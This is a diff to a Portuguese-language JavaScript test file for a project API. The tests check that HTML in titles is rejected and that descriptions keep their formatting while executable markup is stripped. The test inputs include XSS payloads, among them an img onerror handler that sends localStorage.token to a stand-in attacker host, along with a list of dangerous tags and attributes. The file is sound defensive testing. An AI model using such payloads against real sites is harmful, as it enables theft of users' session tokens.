@@ -137,14 +137,40 @@ describe('moderação: edição de projeto aprovado', () => {
 });
 
 describe('HTML nos textos do projeto', () => {
-  test('a API recusa HTML na descrição e no título', async () => {
-    const creator = addUser('creator');
-    const payload = 'Projeto legal <img src=x onerror="fetch(`//atacante.example/?t=`+localStorage.token)">';
-    for (const body of [{ title: 'XSS', description: payload }, { title: '<b>XSS</b>', description: 'Descrição normal' }]) {
-      const res = await call('POST', '/projects', { user: creator, body: { ...body, media: VIDEO } });
-      assert.equal(res.status, 400);
-    }
+  test('a API recusa HTML no título', async () => {
+    const res = await call('POST', '/projects', {
+      user: addUser('creator'),
+      body: { title: '<b>XSS</b>', description: 'Descrição normal', media: VIDEO },
+    });
+    assert.equal(res.status, 400);
     assert.equal(captured.create, undefined);
+  });
+
+  test('a descrição guarda a formatação do editor e descarta o que pode executar código', async () => {
+    const payload = '<b>Projeto</b> <i>legal</i><ul><li>item</li></ul><div style="text-align:center;color:red">centro</div>'
+      + '<img src=x onerror="fetch(`//atacante.example/?t=`+localStorage.token)">'
+      + '<script>alert(1)</script><a href="javascript:alert(1)">link</a><iframe src="//x"></iframe>'
+      + '<div onclick="alert(1)">clique</div>';
+    const res = await call('POST', '/projects', { user: addUser('creator'), body: { title: 'XSS', description: payload, media: VIDEO } });
+    assert.equal(res.status, 201);
+    const stored = captured.create.description;
+    for (const kept of ['<b>Projeto</b>', '<i>legal</i>', '<ul><li>item</li></ul>', 'text-align:center']) {
+      assert.ok(stored.includes(kept), `formatação perdida: ${kept}`);
+    }
+    for (const removed of ['<img', 'onerror', '<script', 'javascript:', '<iframe', 'onclick', 'color:red', '<a ']) {
+      assert.ok(!stored.toLowerCase().includes(removed), `sobrou: ${removed}`);
+    }
+  });
+
+  test('descrição com mais de 3000 caracteres de texto é recusada (as marcações não contam)', async () => {
+    const creator = addUser('creator');
+    const longa = await call('POST', '/projects', { user: creator, body: { title: 'T', description: 'a'.repeat(3001), media: VIDEO } });
+    assert.equal(longa.status, 400);
+    const formatada = await call('POST', '/projects', {
+      user: creator,
+      body: { title: 'T', description: `<b>${'a'.repeat(3000)}</b>`, media: VIDEO },
+    });
+    assert.equal(formatada.status, 201);
   });
 
   test('a edição também recusa HTML', async () => {
